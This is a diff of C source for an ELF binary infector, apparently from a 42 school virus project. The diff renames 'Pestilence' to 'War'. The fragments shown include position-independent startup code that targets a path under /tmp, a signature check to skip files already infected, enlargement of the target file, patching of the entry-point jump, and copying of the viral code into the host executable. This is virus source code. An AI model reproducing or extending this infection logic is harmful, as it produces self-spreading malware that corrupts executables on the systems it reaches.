@@ -1,8 +1,7 @@
-
 /* ************************************************************************** */
 /*                                                                            */
 /*                                                        :::      ::::::::   */
-/*   pestilence.c                                       :+:      :+:    :+:   */
+/*   war.c                                       :+:      :+:    :+:   */
 /*                                                    +:+ +:+         +:+     */
 /*   By: xxxxxxx <xxxxxxx@42.fr>                    +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
@@ -12,23 +11,23 @@
 /* ************************************************************************** */
 
 #include "func.c"
-#include "pestilence.h"
+#include "war.h"
 
-// debut du code de pestilence
-#ifndef PESTILENCE_START
-#define PESTILENCE_START 0x401000
+// debut du code de war
+#ifndef war_START
+#define war_START 0x401000
 #endif
 // taille du code a injecter
-#ifndef PESTILENCE_SIZE
-#define PESTILENCE_SIZE 0x1af6
+#ifndef war_SIZE
+#define war_SIZE 0x1af6
 #endif
 // position du symbole lui meme
 #ifndef START_CALCULATOR_POSITION
 #define START_CALCULATOR_POSITION 0x40204d
 #endif
-// entry point de pestilence
-#ifndef PESTILENCE_ENTRY_POINT
-#define PESTILENCE_ENTRY_POINT 0x402020
+// entry point de war
+#ifndef war_ENTRY_POINT
+#define war_ENTRY_POINT 0x402020
 #endif
 // position de la signature
 #ifndef SIGNATURE_POSITION
@@ -55,7 +54,7 @@ void _start(void)
 	__asm__ volatile("lea (%%rip), %0\n"
 					 "START_CALCULATOR_POSITION:"
 					 : "=r"(begin_ptr));
-	begin_ptr += PESTILENCE_START - START_CALCULATOR_POSITION;
+	begin_ptr += war_START - START_CALCULATOR_POSITION;
 
 	path[0] = '/';
 	path[1] = 't';
@@ -319,7 +318,7 @@ static int parse_file(char *path, inout struct stat *statbuf, inout t_elf *elf,
 		"leaq str4(%%rip), %0\n"
 		"movq $end4-str4, %1\n"
 		"jmp end4\n"
-		"str4: .ascii \"\\nPestilence version 1.0 (c)oded by xxxxxxx - "
+		"str4: .ascii \"\\nwar version 1.0 (c)oded by xxxxxxx - "
 		"yyyyyy\\0\" \n "
 		"end4:\n"
 		: "=r"(ALPHA), "=r"(OMEGA));
@@ -328,7 +327,7 @@ static int parse_file(char *path, inout struct stat *statbuf, inout t_elf *elf,
 		if (!evaluateDriftSignature(*file_data + i++, ALPHA, OMEGA))
 			goto error;
 	elf->header = (ElfW(Ehdr) *) *file_data;
-	*enlarging = PESTILENCE_SIZE;
+	*enlarging = war_SIZE;
 	*enlarging += elf->header->e_phentsize * (elf->header->e_phnum + 1);
 	*enlarging += 0x1000 - statbuf->st_size % 0x1000;
 	vm_release(*file_data, statbuf->st_size);
@@ -431,11 +430,11 @@ static void infect(char *path, void *begin_ptr)
 		= pestis + elf.header->e_phnum * elf.header->e_phentsize;
 	delta -= elf.header->e_entry + JUMP_OFFSET + 4;
 	memcpy(file_data + append_pos + JUMP_OFFSET, &delta, 4);
-	delta = flower - JUMP_OFFSET_INFECTED + PESTILENCE_ENTRY_POINT
-			- PESTILENCE_START - 4;
+	delta = flower - JUMP_OFFSET_INFECTED + war_ENTRY_POINT
+			- war_START - 4;
 	memcpy(file_data + append_pos + JUMP_OFFSET_INFECTED, &delta, 4);
 	append_pos += flower;
-	memcpy(file_data + append_pos, begin_ptr, PESTILENCE_SIZE);
+	memcpy(file_data + append_pos, begin_ptr, war_SIZE);
 clean:
 	if (file_data)
 		vm_release(file_data, statbuf.st_size + enlarging);
